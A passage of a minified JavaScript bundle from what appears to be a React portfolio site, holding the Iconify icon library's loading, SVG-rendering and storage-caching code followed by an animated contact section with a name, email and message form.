    (e || Object.keys(n).concat(Object.keys(r))).forEach(function o(s) {
      if (n[s]) return (i[s] = []);
      if (!(s in i)) {
        i[s] = null;
        const l = r[s] && r[s].parent,
          u = l && o(l);
        u && (i[s] = [l].concat(u));
      }
      return i[s];
    }),
    i
  );
}
function Bw(t, e, n) {
  const r = t.icons,
    i = t.aliases || Object.create(null);
  let o = {};
  function s(l) {
    o = l0(r[l] || i[l], o);
  }
  return s(e), n.forEach(s), l0(t, o);
}
function r_(t, e) {
  const n = [];
  if ("object" != typeof t || "object" != typeof t.icons) return n;
  t.not_found instanceof Array &&
    t.not_found.forEach((i) => {
      e(i, null), n.push(i);
    });
  const r = Uw(t);
  for (const i in r) {
    const o = r[i];
    o && (e(i, Bw(t, i, o)), n.push(i));
  }
  return n;
}
const Vw = { provider: "", aliases: {}, not_found: {}, ...n_ };
function _c(t, e) {
  for (const n in e) if (n in t && typeof t[n] != typeof e[n]) return !1;
  return !0;
}
function i_(t) {
  if ("object" != typeof t || null === t) return null;
  const e = t;
  if (
    "string" != typeof e.prefix ||
    !t.icons ||
    "object" != typeof t.icons ||
    !_c(t, Vw)
  )
    return null;
  const n = e.icons;
  for (const i in n) {
    const o = n[i];
    if (!i.match(Vs) || "string" != typeof o.body || !_c(o, Uf)) return null;
  }
  const r = e.aliases || Object.create(null);
  for (const i in r) {
    const o = r[i],
      s = o.parent;
    if (!i.match(Vs) || "string" != typeof s || (!n[s] && !r[s]) || !_c(o, Uf))
      return null;
  }
  return e;
}
const u0 = Object.create(null);
function Hw(t, e) {
  return {
    provider: t,
    prefix: e,
    icons: Object.create(null),
    missing: new Set(),
  };
}
function Ui(t, e) {
  const n = u0[t] || (u0[t] = Object.create(null));
  return n[e] || (n[e] = Hw(t, e));
}
function cp(t, e) {
  return i_(e)
    ? r_(e, (n, r) => {
        r ? (t.icons[n] = r) : t.missing.add(n);
      })
    : [];
}
function bw(t, e, n) {
  try {
    if ("string" == typeof n.body) return (t.icons[e] = { ...n }), !0;
  } catch {}
  return !1;
}
let dl = !1;
function o_(t) {
  return "boolean" == typeof t && (dl = t), dl;
}
function $w(t) {
  const e = "string" == typeof t ? Ea(t, !0, dl) : t;
  if (e) {
    const n = Ui(e.provider, e.prefix),
      r = e.name;
    return n.icons[r] || (n.missing.has(r) ? null : void 0);
  }
}
function Ww(t, e) {
  const n = Ea(t, !0, dl);
  if (!n) return !1;
  return bw(Ui(n.provider, n.prefix), n.name, e);
}
function Yw(t, e) {
  if ("object" != typeof t) return !1;
  if (("string" != typeof e && (e = t.provider || ""), dl && !e && !t.prefix)) {
    let i = !1;
    return (
      i_(t) &&
        ((t.prefix = ""),
        r_(t, (o, s) => {
          s && Ww(o, s) && (i = !0);
        })),
      i
    );
  }
  const n = t.prefix;
  if (!yu({ provider: e, prefix: n, name: "a" })) return !1;
  return !!cp(Ui(e, n), t);
}
const s_ = Object.freeze({ width: null, height: null }),
  l_ = Object.freeze({ ...s_, ...ia }),
  Xw = /(-?[0-9.]*[0-9]+[0-9.]*)/g,
  Qw = /^-?[0-9.]*[0-9]+[0-9.]*$/g;
function a0(t, e, n) {
  if (1 === e) return t;
  if (((n = n || 100), "number" == typeof t)) return Math.ceil(t * e * n) / n;
  if ("string" != typeof t) return t;
  const r = t.split(Xw);
  if (null === r || !r.length) return t;
  const i = [];
  let o = r.shift(),
    s = Qw.test(o);
  for (;;) {
    if (s) {
      const l = parseFloat(o);
      isNaN(l) ? i.push(o) : i.push(Math.ceil(l * e * n) / n);
    } else i.push(o);
    if (((o = r.shift()), void 0 === o)) return i.join("");
    s = !s;
  }
}
const Gw = (t) => "unset" === t || "undefined" === t || "none" === t;
function Kw(t, e) {
  const n = { ...ap, ...t },
    r = { ...l_, ...e },
    i = { left: n.left, top: n.top, width: n.width, height: n.height };
  let o = n.body;
  [n, r].forEach((v) => {
    const g = [],
      T = v.hFlip,
      m = v.vFlip;
    let _,
      h = v.rotate;
    switch (
      (T
        ? m
          ? (h += 2)
          : (g.push(
              "translate(" +
                (i.width + i.left).toString() +
                " " +
                (0 - i.top).toString() +
                ")"
            ),
            g.push("scale(-1 1)"),
            (i.top = i.left = 0))
        : m &&
          (g.push(
            "translate(" +
              (0 - i.left).toString() +
              " " +
              (i.height + i.top).toString() +
              ")"
          ),
          g.push("scale(1 -1)"),
          (i.top = i.left = 0)),
      h < 0 && (h -= 4 * Math.floor(h / 4)),
      (h %= 4),
      h)
    ) {
      case 1:
        (_ = i.height / 2 + i.top),
          g.unshift("rotate(90 " + _.toString() + " " + _.toString() + ")");
        break;
      case 2:
        g.unshift(
          "rotate(180 " +
            (i.width / 2 + i.left).toString() +
            " " +
            (i.height / 2 + i.top).toString() +
            ")"
        );
        break;
      case 3:
        (_ = i.width / 2 + i.left),
          g.unshift("rotate(-90 " + _.toString() + " " + _.toString() + ")");
    }
    h % 2 == 1 &&
      (i.left !== i.top && ((_ = i.left), (i.left = i.top), (i.top = _)),
      i.width !== i.height &&
        ((_ = i.width), (i.width = i.height), (i.height = _))),
      g.length && (o = '<g transform="' + g.join(" ") + '">' + o + "</g>");
  });
  const s = r.width,
    l = r.height,
    u = i.width,
    a = i.height;
  let c, p;
  null === s
    ? ((p = null === l ? "1em" : "auto" === l ? a : l), (c = a0(p, u / a)))
    : ((c = "auto" === s ? u : s),
      (p = null === l ? a0(c, a / u) : "auto" === l ? a : l));
  const f = {},
    d = (v, g) => {
      Gw(g) || (f[v] = g.toString());
    };
  return (
    d("width", c),
    d("height", p),
    (f.viewBox =
      i.left.toString() +
      " " +
      i.top.toString() +
      " " +
      u.toString() +
      " " +
      a.toString()),
    { attributes: f, body: o }
  );
}
const qw = /\sid="(\S+)"/g,
  Zw =
    "IconifyId" +
    Date.now().toString(16) +
    ((16777216 * Math.random()) | 0).toString(16);
let Jw = 0;
function e2(t, e = Zw) {
  const n = [];
  let r;
  for (; (r = qw.exec(t)); ) n.push(r[1]);
  if (!n.length) return t;
  const i = "suffix" + ((16777216 * Math.random()) | Date.now()).toString(16);
  return (
    n.forEach((o) => {
      const s = "function" == typeof e ? e(o) : e + (Jw++).toString(),
        l = o.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      t = t.replace(
        new RegExp('([#;"])(' + l + ')([")]|\\.[a-z])', "g"),
        "$1" + s + i + "$3"
      );
    }),
    (t = t.replace(new RegExp(i, "g"), ""))
  );
}
const Bf = Object.create(null);
function t2(t, e) {
  Bf[t] = e;
}
function Vf(t) {
  return Bf[t] || Bf[""];
}
function fp(t) {
  let e;
  if ("string" == typeof t.resources) e = [t.resources];
  else if (((e = t.resources), !(e instanceof Array && e.length))) return null;
  return {
    resources: e,
    path: t.path || "/",
    maxURL: t.maxURL || 500,
    rotate: t.rotate || 750,
    timeout: t.timeout || 5e3,
    random: !0 === t.random,
    index: t.index || 0,
    dataAfterTimeout: !1 !== t.dataAfterTimeout,
  };
}
const dp = Object.create(null),
  cs = ["https://api.simplesvg.com", "https://api.unisvg.com"],
  xu = [];
for (; cs.length > 0; )
  1 === cs.length || Math.random() > 0.5
    ? xu.push(cs.shift())
    : xu.push(cs.pop());
function n2(t, e) {
  const n = fp(e);
  return null !== n && ((dp[t] = n), !0);
}
function pp(t) {
  return dp[t];
}
dp[""] = fp({ resources: ["https://api.iconify.design"].concat(xu) });
const r2 = () => {
  let t;
  try {
    if (((t = fetch), "function" == typeof t)) return t;
  } catch {}
};
let c0 = r2();
function i2(t, e) {
  const n = pp(t);
  if (!n) return 0;
  let r;
  if (n.maxURL) {
    let i = 0;
    n.resources.forEach((s) => {
      i = Math.max(i, s.length);
    });
    const o = e + ".json?icons=";
    r = n.maxURL - i - n.path.length - o.length;
  } else r = 0;
  return r;
}
function o2(t) {
  return 404 === t;
}
const s2 = (t, e, n) => {
  const r = [],
    i = i2(t, e),
    o = "icons";
  let s = { type: o, provider: t, prefix: e, icons: [] },
    l = 0;
  return (
    n.forEach((u, a) => {
      (l += u.length + 1),
        l >= i &&
          a > 0 &&
          (r.push(s),
          (s = { type: o, provider: t, prefix: e, icons: [] }),
          (l = u.length)),
        s.icons.push(u);
    }),
    r.push(s),
    r
  );
};
function l2(t) {
  if ("string" == typeof t) {
    const e = pp(t);
    if (e) return e.path;
  }
  return "/";
}
const u2 = (t, e, n) => {
    if (!c0) return void n("abort", 424);
    let r = l2(e.provider);
    switch (e.type) {
      case "icons": {
        const o = e.prefix,
          l = e.icons.join(",");
        r += o + ".json?" + new URLSearchParams({ icons: l }).toString();
        break;
      }
      case "custom": {
        const o = e.uri;
        r += "/" === o.slice(0, 1) ? o.slice(1) : o;
        break;
      }
      default:
        return void n("abort", 400);
    }
    let i = 503;
    c0(t + r)
      .then((o) => {
        const s = o.status;
        if (200 === s) return (i = 501), o.json();
        setTimeout(() => {
          n(o2(s) ? "abort" : "next", s);
        });
      })
      .then((o) => {
        "object" == typeof o && null !== o
          ? setTimeout(() => {
              n("success", o);
            })
          : setTimeout(() => {
              404 === o ? n("abort", o) : n("next", i);
            });
      })
      .catch(() => {
        n("next", i);
      });
  },
  a2 = { prepare: s2, send: u2 };
function c2(t) {
  const e = { loaded: [], missing: [], pending: [] },
    n = Object.create(null);
  t.sort((i, o) =>
    i.provider !== o.provider
      ? i.provider.localeCompare(o.provider)
      : i.prefix !== o.prefix
      ? i.prefix.localeCompare(o.prefix)
      : i.name.localeCompare(o.name)
  );
  let r = { provider: "", prefix: "", name: "" };
  return (
    t.forEach((i) => {
      if (
        r.name === i.name &&
        r.prefix === i.prefix &&
        r.provider === i.provider
      )
        return;
      r = i;
      const o = i.provider,
        s = i.prefix,
        l = i.name,
        u = n[o] || (n[o] = Object.create(null)),
        a = u[s] || (u[s] = Ui(o, s));
      let c;
      c =
        l in a.icons
          ? e.loaded
          : "" === s || a.missing.has(l)
          ? e.missing
          : e.pending;
      const p = { provider: o, prefix: s, name: l };
      c.push(p);
    }),
    e
  );
}
function u_(t, e) {
  t.forEach((n) => {
    const r = n.loaderCallbacks;
    r && (n.loaderCallbacks = r.filter((i) => i.id !== e));
  });
}
function f2(t) {
  t.pendingCallbacksFlag ||
    ((t.pendingCallbacksFlag = !0),
    setTimeout(() => {
      t.pendingCallbacksFlag = !1;
      const e = t.loaderCallbacks ? t.loaderCallbacks.slice(0) : [];
      if (!e.length) return;
      let n = !1;
      const r = t.provider,
        i = t.prefix;
      e.forEach((o) => {
        const s = o.icons,
          l = s.pending.length;
        (s.pending = s.pending.filter((u) => {
          if (u.prefix !== i) return !0;
          const a = u.name;
          if (t.icons[a]) s.loaded.push({ provider: r, prefix: i, name: a });
          else {
            if (!t.missing.has(a)) return (n = !0), !0;
            s.missing.push({ provider: r, prefix: i, name: a });
          }
          return !1;
        })),
          s.pending.length !== l &&
            (n || u_([t], o.id),
            o.callback(
              s.loaded.slice(0),
              s.missing.slice(0),
              s.pending.slice(0),
              o.abort
            ));
      });
    }));
}
let d2 = 0;
function p2(t, e, n) {
  const r = d2++,
    i = u_.bind(null, n, r);
  if (!e.pending.length) return i;
  const o = { id: r, icons: e, callback: t, abort: i };
  return (
    n.forEach((s) => {
      (s.loaderCallbacks || (s.loaderCallbacks = [])).push(o);
    }),
    i
  );
}
function h2(t, e = !0, n = !1) {
  const r = [];
  return (
    t.forEach((i) => {
      const o = "string" == typeof i ? Ea(i, e, n) : i;
      o && r.push(o);
    }),
    r
  );
}
var m2 = {
  resources: [],
  index: 0,
  timeout: 2e3,
  rotate: 750,
  random: !1,
  dataAfterTimeout: !1,
};
function g2(t, e, n, r) {
  const i = t.resources.length,
    o = t.random ? Math.floor(Math.random() * i) : t.index;
  let s;
  if (t.random) {
    let k = t.resources.slice(0);
    for (s = []; k.length > 1; ) {
      const S = Math.floor(Math.random() * k.length);
      s.push(k[S]), (k = k.slice(0, S).concat(k.slice(S + 1)));
    }
    s = s.concat(k);
  } else s = t.resources.slice(o).concat(t.resources.slice(0, o));
  const l = Date.now();
  let c,
    u = "pending",
    a = 0,
    p = null,
    f = [],
    d = [];
  function v() {
    p && (clearTimeout(p), (p = null));
  }
  function g() {
    "pending" === u && (u = "aborted"),
      v(),
      f.forEach((k) => {
        "pending" === k.status && (k.status = "aborted");
      }),
      (f = []);
  }
  function T(k, S) {
    S && (d = []), "function" == typeof k && d.push(k);
  }
  function h() {
    (u = "failed"),
      d.forEach((k) => {
        k(void 0, c);
      });
  }
  function _() {
    f.forEach((k) => {
      "pending" === k.status && (k.status = "aborted");
    }),
      (f = []);
  }
  function C() {
    if ("pending" !== u) return;
    v();
    const k = s.shift();
    if (void 0 === k)
      return f.length
        ? void (p = setTimeout(() => {
            v(), "pending" === u && (_(), h());
          }, t.timeout))
        : void h();
    const S = {
      status: "pending",
      resource: k,
      callback: (E, P) => {
        !(function y(k, S, E) {
          const P = "success" !== S;
          switch (((f = f.filter((N) => N !== k)), u)) {
            case "pending":
              break;
            case "failed":
              if (P || !t.dataAfterTimeout) return;
              break;
            default:
              return;
          }
          if ("abort" === S) return (c = E), void h();
          if (P) return (c = E), void (f.length || (s.length ? C() : h()));
          if ((v(), _(), !t.random)) {
            const N = t.resources.indexOf(k.resource);
            -1 !== N && N !== t.index && (t.index = N);
          }
          (u = "completed"),
            d.forEach((N) => {
              N(E);
            });
        })(S, E, P);
      },
    };
    f.push(S), a++, (p = setTimeout(C, t.rotate)), n(k, e, S.callback);
  }
  return (
    "function" == typeof r && d.push(r),
    setTimeout(C),
    function m() {
      return {
        startTime: l,
        payload: e,
        status: u,
        queriesSent: a,
        queriesPending: f.length,
        subscribe: T,
        abort: g,
      };
    }
  );
}
function a_(t) {
  const e = { ...m2, ...t };
  let n = [];
  function r() {
    n = n.filter((l) => "pending" === l().status);
  }
  return {
    query: function i(l, u, a) {
      const c = g2(e, l, u, (p, f) => {
        r(), a && a(p, f);
      });
      return n.push(c), c;
    },
    find: function o(l) {
      return n.find((u) => l(u)) || null;
    },
    setIndex: (l) => {
      e.index = l;
    },
    getIndex: () => e.index,
    cleanup: r,
  };
}
function f0() {}
const vc = Object.create(null);
function _2(t) {
  if (!vc[t]) {
    const e = pp(t);
    if (!e) return;
    const r = { config: e, redundancy: a_(e) };
    vc[t] = r;
  }
  return vc[t];
}
function v2(t, e, n) {
  let r, i;
  if ("string" == typeof t) {
    const o = Vf(t);
    if (!o) return n(void 0, 424), f0;
    i = o.send;
    const s = _2(t);
    s && (r = s.redundancy);
  } else {
    const o = fp(t);
    if (o) {
      r = a_(o);
      const l = Vf(t.resources ? t.resources[0] : "");
      l && (i = l.send);
    }
  }
  return r && i ? r.query(e, i, n)().abort : (n(void 0, 424), f0);
}
const d0 = "iconify2",
  pl = "iconify",
  c_ = pl + "-count",
  p0 = pl + "-version",
  f_ = 36e5,
  y2 = 168;
function Hf(t, e) {
  try {
    return t.getItem(e);
  } catch {}
}
function hp(t, e, n) {
  try {
    return t.setItem(e, n), !0;
  } catch {}
}
function h0(t, e) {
  try {
    t.removeItem(e);
  } catch {}
}
function bf(t, e) {
  return hp(t, c_, e.toString());
}
function $f(t) {
  return parseInt(Hf(t, c_)) || 0;
}
const Pa = { local: !0, session: !0 },
  d_ = { local: new Set(), session: new Set() };
let mp = !1;
function x2(t) {
  mp = t;
}
let Gl = typeof window > "u" ? {} : window;
function p_(t) {
  const e = t + "Storage";
  try {
    if (Gl && Gl[e] && "number" == typeof Gl[e].length) return Gl[e];
  } catch {}
  Pa[t] = !1;
}
function h_(t, e) {
  const n = p_(t);
  if (!n) return;
  const r = Hf(n, p0);
  if (r !== d0) {
    if (r) {
      const l = $f(n);
      for (let u = 0; u < l; u++) h0(n, pl + u.toString());
    }
    return hp(n, p0, d0), void bf(n, 0);
  }
  const i = Math.floor(Date.now() / f_) - y2,
    o = (l) => {
      const u = pl + l.toString(),
        a = Hf(n, u);
      if ("string" == typeof a) {
        try {
          const c = JSON.parse(a);
          if (
            "object" == typeof c &&
            "number" == typeof c.cached &&
            c.cached > i &&
            "string" == typeof c.provider &&
            "object" == typeof c.data &&
            "string" == typeof c.data.prefix &&
            e(c, l)
          )
            return !0;
        } catch {}
        h0(n, u);
      }
    };
  let s = $f(n);
  for (let l = s - 1; l >= 0; l--)
    o(l) || (l === s - 1 ? (s--, bf(n, s)) : d_[t].add(l));
}
function m_() {
  if (!mp) {
    x2(!0);
    for (const t in Pa)
      h_(t, (e) => {
        const n = e.data,
          o = Ui(e.provider, n.prefix);
        if (!cp(o, n).length) return !1;
        const s = n.lastModified || -1;
        return (
          (o.lastModifiedCached = o.lastModifiedCached
            ? Math.min(o.lastModifiedCached, s)
            : s),
          !0
        );
      });
  }
}
function w2(t, e) {
  const n = t.lastModifiedCached;
  if (n && n >= e) return n === e;
  if (((t.lastModifiedCached = e), n))
    for (const r in Pa)
      h_(r, (i) => {
        const o = i.data;
        return (
          i.provider !== t.provider ||
          o.prefix !== t.prefix ||
          o.lastModified === e
        );
      });
  return !0;
}
function S2(t, e) {
  function n(r) {
    let i;
    if (!Pa[r] || !(i = p_(r))) return;
    const o = d_[r];
    let s;
    if (o.size) o.delete((s = Array.from(o).shift()));
    else if (((s = $f(i)), !bf(i, s + 1))) return;
    const l = {
      cached: Math.floor(Date.now() / f_),
      provider: t.provider,
      data: e,
    };
    return hp(i, pl + s.toString(), JSON.stringify(l));
  }
  mp || m_(),
    (e.lastModified && !w2(t, e.lastModified)) ||
      (Object.keys(e.icons).length &&
        (e.not_found && delete (e = Object.assign({}, e)).not_found,
        n("local") || n("session")));
}
function m0() {}
function k2(t) {
  t.iconsLoaderFlag ||
    ((t.iconsLoaderFlag = !0),
    setTimeout(() => {
      (t.iconsLoaderFlag = !1), f2(t);
    }));
}
function C2(t, e) {
  t.iconsToLoad
    ? (t.iconsToLoad = t.iconsToLoad.concat(e).sort())
    : (t.iconsToLoad = e),
    t.iconsQueueFlag ||
      ((t.iconsQueueFlag = !0),
      setTimeout(() => {
        t.iconsQueueFlag = !1;
        const { provider: n, prefix: r } = t,
          i = t.iconsToLoad;
        let o;
        delete t.iconsToLoad,
          i &&
            (o = Vf(n)) &&
            o.prepare(n, r, i).forEach((l) => {
              v2(n, l, (u) => {
                if ("object" != typeof u)
                  l.icons.forEach((a) => {
                    t.missing.add(a);
                  });
                else
                  try {
                    const a = cp(t, u);
                    if (!a.length) return;
                    const c = t.pendingIcons;
                    c &&
                      a.forEach((p) => {
                        c.delete(p);
                      }),
                      S2(t, u);
                  } catch (a) {
                    console.error(a);
                  }
                k2(t);
              });
            });
      }));
}
const T2 = (t, e) => {
  const r = c2(h2(t, !0, o_()));
  if (!r.pending.length) {
    let u = !0;
    return (
      e &&
        setTimeout(() => {
          u && e(r.loaded, r.missing, r.pending, m0);
        }),
      () => {
        u = !1;
      }
    );
  }
  const i = Object.create(null),
    o = [];
  let s, l;
  return (
    r.pending.forEach((u) => {
      const { provider: a, prefix: c } = u;
      if (c === l && a === s) return;
      (s = a), (l = c), o.push(Ui(a, c));
      const p = i[a] || (i[a] = Object.create(null));
      p[c] || (p[c] = []);
    }),
    r.pending.forEach((u) => {
      const { provider: a, prefix: c, name: p } = u,
        f = Ui(a, c),
        d = f.pendingIcons || (f.pendingIcons = new Set());
      d.has(p) || (d.add(p), i[a][c].push(p));
    }),
    o.forEach((u) => {
      const { provider: a, prefix: c } = u;
      i[a][c].length && C2(u, i[a][c]);
    }),
    e ? p2(e, r, o) : m0
  );
};
function E2(t, e) {
  const n = { ...t };
  for (const r in e) {
    const i = e[r],
      o = typeof i;
    r in s_
      ? (null === i || (i && ("string" === o || "number" === o))) && (n[r] = i)
      : o === typeof n[r] && (n[r] = "rotate" === r ? i % 4 : i);
  }
  return n;
}
const P2 = /[\s,]+/;
function N2(t, e) {
  e.split(P2).forEach((n) => {
    switch (n.trim()) {
      case "horizontal":
        t.hFlip = !0;
        break;
      case "vertical":
        t.vFlip = !0;
    }
  });
}
function M2(t, e = 0) {
  const n = t.replace(/^-?[0-9.]*/, "");
  function r(i) {
    for (; i < 0; ) i += 4;
    return i % 4;
  }
  if ("" === n) {
    const i = parseInt(t);
    return isNaN(i) ? 0 : r(i);
  }
  if (n !== t) {
    let i = 0;
    switch (n) {
      case "%":
        i = 25;
        break;
      case "deg":
        i = 90;
    }
    if (i) {
      let o = parseFloat(t.slice(0, t.length - n.length));
      return isNaN(o) ? 0 : ((o /= i), o % 1 == 0 ? r(o) : 0);
    }
  }
  return e;
}
function O2(t, e) {
  let n =
    -1 === t.indexOf("xlink:")
      ? ""
      : ' xmlns:xlink="http://www.w3.org/1999/xlink"';
  for (const r in e) n += " " + r + '="' + e[r] + '"';
  return '<svg xmlns="http://www.w3.org/2000/svg"' + n + ">" + t + "</svg>";
}
function R2(t) {
  return t
    .replace(/"/g, "'")
    .replace(/%/g, "%25")
    .replace(/#/g, "%23")
    .replace(/</g, "%3C")
    .replace(/>/g, "%3E")
    .replace(/\s+/g, " ");
}
function D2(t) {
  return 'url("data:image/svg+xml,' + R2(t) + '")';
}
const g_ = { ...l_, inline: !1 },
  L2 = {
    xmlns: "http://www.w3.org/2000/svg",
    xmlnsXlink: "http://www.w3.org/1999/xlink",
    "aria-hidden": !0,
    role: "img",
  },
  z2 = { display: "inline-block" },
  Wf = { backgroundColor: "currentColor" },
  __ = { backgroundColor: "transparent" },
  g0 = { Image: "var(--svg)", Repeat: "no-repeat", Size: "100% 100%" },
  _0 = { webkitMask: Wf, mask: Wf, background: __ };
for (const t in _0) {
  const e = _0[t];
  for (const n in g0) e[t + n] = g0[n];
}
const j2 = { ...g_, inline: !0 };
function v0(t) {
  return t + (t.match(/^[-0-9.]+$/) ? "px" : "");
}
const I2 = (t, e, n, r) => {
  const i = n ? j2 : g_,
    o = E2(i, e),
    s = e.mode || "svg",
    l = {},
    u = e.style || {},
    a = { ...("svg" === s ? L2 : {}), ref: r };
  for (let m in e) {
    const h = e[m];
    if (void 0 !== h)
      switch (m) {
        case "icon":
        case "style":
        case "children":
        case "onLoad":
        case "mode":
        case "_ref":
        case "_inline":
          break;
        case "inline":
        case "hFlip":
        case "vFlip":
          o[m] = !0 === h || "true" === h || 1 === h;
          break;
        case "flip":
          "string" == typeof h && N2(o, h);
          break;
        case "color":
          l.color = h;
          break;
        case "rotate":
          "string" == typeof h
            ? (o[m] = M2(h))
            : "number" == typeof h && (o[m] = h);
          break;
        case "ariaHidden":
        case "aria-hidden":
          !0 !== h && "true" !== h && delete a["aria-hidden"];
          break;
        default:
          void 0 === i[m] && (a[m] = h);
      }
  }
  const c = Kw(t, o),
    p = c.attributes;
  if ((o.inline && (l.verticalAlign = "-0.125em"), "svg" === s)) {
    (a.style = { ...l, ...u }), Object.assign(a, p);
    let m = 0,
      h = e.id;
    return (
      "string" == typeof h && (h = h.replace(/-/g, "_")),
      (a.dangerouslySetInnerHTML = {
        __html: e2(c.body, h ? () => h + "ID" + m++ : "iconifyReact"),
      }),
      mr.createElement("svg", a)
    );
  }
  const { body: f, width: d, height: v } = t,
    g = "mask" === s || ("bg" !== s && -1 !== f.indexOf("currentColor")),
    T = O2(f, { ...p, width: d + "", height: v + "" });
  return (
    (a.style = {
      ...l,
      "--svg": D2(T),
      width: v0(p.width),
      height: v0(p.height),
      ...z2,
      ...(g ? Wf : __),
      ...u,
    }),
    mr.createElement("span", a)
  );
};
if ((o_(!0), t2("", a2), typeof document < "u" && typeof window < "u")) {
  m_();
  const t = window;
  if (void 0 !== t.IconifyPreload) {
    const e = t.IconifyPreload,
      n = "Invalid IconifyPreload syntax.";
    "object" == typeof e &&
      null !== e &&
      (e instanceof Array ? e : [e]).forEach((r) => {
        try {
          ("object" != typeof r ||
            null === r ||
            r instanceof Array ||
            "object" != typeof r.icons ||
            "string" != typeof r.prefix ||
            !Yw(r)) &&
            console.error(n);
        } catch {
          console.error(n);
        }
      });
  }
  if (void 0 !== t.IconifyProviders) {
    const e = t.IconifyProviders;
    if ("object" == typeof e && null !== e)
      for (let n in e) {
        const r = "IconifyProviders[" + n + "] is invalid.";
        try {
          const i = e[n];
          if ("object" != typeof i || !i || void 0 === i.resources) continue;
          n2(n, i) || console.error(r);
        } catch {
          console.error(r);
        }
      }
  }
}
class v_ extends mr.Component {
  constructor(e) {
    super(e), (this.state = { icon: null });
  }
  _abortLoading() {
    this._loading && (this._loading.abort(), (this._loading = null));
  }
  _setData(e) {
    this.state.icon !== e && this.setState({ icon: e });
  }
  _checkIcon(e) {
    const n = this.state,
      r = this.props.icon;
    if ("object" == typeof r && null !== r && "string" == typeof r.body)
      return (
        (this._icon = ""),
        this._abortLoading(),
        void ((e || null === n.icon) && this._setData({ data: r }))
      );
    let i;
    if ("string" != typeof r || null === (i = Ea(r, !1, !0)))
      return this._abortLoading(), void this._setData(null);
    const o = $w(i);
    if (o) {
      if (this._icon !== r || null === n.icon) {
        this._abortLoading(), (this._icon = r);
        const s = ["iconify"];
        "" !== i.prefix && s.push("iconify--" + i.prefix),
          "" !== i.provider && s.push("iconify--" + i.provider),
          this._setData({ data: o, classes: s }),
          this.props.onLoad && this.props.onLoad(r);
      }
    } else
      (!this._loading || this._loading.name !== r) &&
        (this._abortLoading(),
        (this._icon = ""),
        this._setData(null),
        null !== o &&
          (this._loading = {
            name: r,
            abort: T2([i], this._checkIcon.bind(this, !1)),
          }));
  }
  componentDidMount() {
    this._checkIcon(!1);
  }
  componentDidUpdate(e) {
    e.icon !== this.props.icon && this._checkIcon(!0);
  }
  componentWillUnmount() {
    this._abortLoading();
  }
  render() {
    const e = this.props,
      n = this.state.icon;
    if (null === n)
      return e.children ? e.children : mr.createElement("span", {});
    let r = e;
    return (
      n.classes &&
        (r = {
          ...e,
          className:
            ("string" == typeof e.className ? e.className + " " : "") +
            n.classes.join(" "),
        }),
      I2({ ...ap, ...n.data }, r, e._inline, e._ref)
    );
  }
}
const Kl = mr.forwardRef(function (e, n) {
  const r = { ...e, _ref: n, _inline: !1 };
  return mr.createElement(v_, r);
});
function A2() {
  const [t, e] = K.useState(new Date().toLocaleTimeString()),
    n = K.useRef(null),
    r = K.useRef(null),
    i = K.useRef(null);
  return (
    K.useEffect(() => {
      b.create({
        trigger: i.current,
        start: "180px bottom",
        animation: bt
          .timeline()
          .to(
            n.current,
            { opacity: 1, y: 0, ease: "power4.out", duration: 1.25 },
            0
          )
          .to(
            r.current,
            { opacity: 1, y: 0, ease: "power4.out", duration: 1.25 },
            0.2
          ),
        toggleActions: "play none none none",
      }),
        b.refresh();
    }, [i]),
    K.useEffect(() => {
      setInterval(() => {
        e(new Date().toLocaleTimeString());
      }, 1e3);
    }),
    w.jsxs("section", {
      id: "contact",
      className: "my-[10%] overflow-hidden",
      "aria-label": "contact me",
      children: [
        w.jsx(Ta, { title: "Contact" }),
        w.jsxs("div", {
          ref: i,
          className:
            "mt-10 flex flex-col gap-20 md:grid md:grid-cols-6 md:px-12",
          children: [
            w.jsxs("div", {
              className: "col-span-4",
              children: [
                w.jsx("h3", {
                  ref: n,
                  className:
                    "max-w-lg 2xl:max-w-3xl text-heading-3 2xl:text-7xl font-semibold leading-tight translate-y-10 opacity-0",
                  children: "Have an awesome idea? Let's bring it to life.",
                }),
                w.jsx("p", {
                  ref: r,
                  className:
                    "mt-4 max-w-md 2xl:max-w-2xl text-body-2 2xl:text-4xl text-accent-100 translate-y-10 opacity-0",
                  children:
                    "I am looking for freelance opportunities or internships in startups, agencies, and design studios.",
                }),
                w.jsxs("form", {
                  name: "contact",
                  action: "/contact",
                  autoComplete: "off",
                  className: "mt-10 font-grotesk",
                  method: "POST",
                  children: [
                    w.jsx("input", {
                      type: "hidden",
                      name: "form-name",
                      value: "contact",
                    }),
                    w.jsxs("div", {
                      className:
                        "grid grid-cols-1 gap-x-6 gap-y-12 sm:grid-cols-2",
                      children: [
                        w.jsxs("div", {
                          className: "relative z-0",
                          children: [
                            w.jsx("input", {
                              required: !0,
                              type: "text",
                              id: "name",
                              name: "name",
                              className:
                                "peer block w-full appearance-none border-0 border-b border-accent-100 bg-transparent px-0 py-2.5 focus:outline-none focus:ring-0",
                              placeholder: " ",
                            }),
                            w.jsx("label", {
                              htmlFor: "name",
                              className:
                                "absolute top-3 -z-10 origin-[0] -translate-y-6 scale-75 transform text-body-3 2xl:text-body-2 text-secondary-600 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-0 peer-focus:-translate-y-6 peer-focus:scale-75",
                              children: "Your name",
                            }),
                          ],
                        }),
                        w.jsxs("div", {
                          className: "relative z-0",
                          children: [
                            w.jsx("input", {
                              required: !0,
                              type: "text",
                              name: "email",
                              id: "email",
                              className:
                                "peer block w-full appearance-none border-0 border-b border-accent-100 bg-transparent px-0 py-2.5 focus:outline-none focus:ring-0",
                              placeholder: " ",
                            }),
                            w.jsx("label", {
                              htmlFor: "email",
                              className:
                                "absolute top-3 -z-10 origin-[0] -translate-y-6 scale-75 transform text-body-3 2xl:text-body-2 text-secondary-600 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-0 peer-focus:-translate-y-6 peer-focus:scale-75",
                              children: "Your email",
                            }),
                          ],
                        }),
                        w.jsxs("div", {
                          className: "relative z-0 sm:col-span-2",
                          children: [
                            w.jsx("textarea", {
                              required: !0,
                              id: "message",
                              name: "message",
                              rows: "5",
                              className:
                                "peer block w-full appearance-none border-0 border-b border-accent-100 bg-transparent px-0 py-2.5 focus:outline-none focus:ring-0",
                              placeholder: " ",
                            }),
                            w.jsx("label", {
                              htmlFor: "message",
                              className:
                                "absolute top-3 -z-10 origin-[0] -translate-y-6 scale-75 transform text-body-3 2xl:text-body-2 text-secondary-600 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-0 peer-focus:-translate-y-6 peer-focus:scale-75",
                              children: "Your message",
